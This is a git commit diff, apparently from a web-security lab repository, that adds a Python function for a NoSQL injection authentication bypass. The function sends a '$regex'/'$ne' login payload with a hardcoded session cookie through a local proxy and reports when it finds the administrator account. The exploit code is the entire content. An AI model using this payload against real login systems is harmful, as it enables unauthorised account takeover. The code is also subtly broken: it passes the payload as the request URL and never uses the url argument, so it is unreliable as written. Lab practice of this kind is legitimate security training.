4bc98319f67e1a1f33950f8e4c8664ae32200ff3
Jozenartes <jozenarts12@gmail.com>
2025-07-01 16:34:36 +0100

    Added payload function

--- 05-SQL-Injection/Lab-03/NoSQl.py
+++ 05-SQL-Injection/Lab-03/NoSQl.py
@@ -3,10 +3,19 @@ import requests
 import string
 import urllib3
 import urllib
+from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'https': 'http://127.0.0.1:8080', 'http': 'http://127.0.0.1:8080'}
+
+def nosql_check(url):
+    nosql_payload = '{"username":{"$regex": "admin.*"},"password": {"$ne": ""}}'
+    cookies = {'session': 'ec8COP3nuD4NdB56xdwji1DkQZF6ErRD'}
+    r = requests.post(nosql_payload, cookies=cookies, verify=False, proxies=proxies)
+    res = r.text
+    if "admin" in res:
+        print('[+] You found the administrator account')
 
 
 def main():
